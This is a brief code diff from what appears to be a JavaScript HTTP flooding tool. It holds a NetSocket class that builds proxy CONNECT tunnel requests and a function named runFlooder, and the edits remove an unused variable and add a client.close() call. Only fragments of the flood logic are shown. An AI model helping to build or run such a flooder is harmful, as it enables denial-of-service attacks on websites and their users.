@@ -93,7 +93,6 @@ class NetSocket {
 
     HTTP(options, callback) {
         const parsedAddr = options.address.split(':');
-        const addrHost = parsedAddr[0];
         const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
         const buffer = Buffer.from(payload);
 
@@ -250,4 +249,6 @@ function runFlooder() {
                 // Handle response data if needed
             });
 
-            request.on('end', () =>
+            request.on('end', () => {
+                client.close();
+            
